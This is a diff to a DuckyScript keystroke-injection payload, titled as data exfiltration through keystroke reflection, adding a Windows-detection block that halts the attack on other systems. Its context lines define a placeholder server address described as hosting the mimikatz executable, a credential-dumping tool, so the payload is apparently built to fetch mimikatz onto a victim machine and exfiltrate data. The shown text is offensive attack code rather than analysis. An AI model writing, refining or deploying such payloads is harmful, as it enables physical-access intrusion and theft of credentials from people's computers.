@@ -2,6 +2,34 @@ REM Title: DuckyScript payload for data exfiltration using keystroke reflection
 REM Author: jakobfriedl
 ATTACKMODE HID
 
+REM OS Detection to ensure the target is Windows
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS != WINDOWS)                                                                                                                 
+    LED_R                                                                                                                                       
+    STOP_PAYLOAD 
+END_IF
+
 REM Define the URL of the server hosting the mimikatz executable
 DEFINE #SERVER_URL http://XXX.XXX.XXX.XXX
 
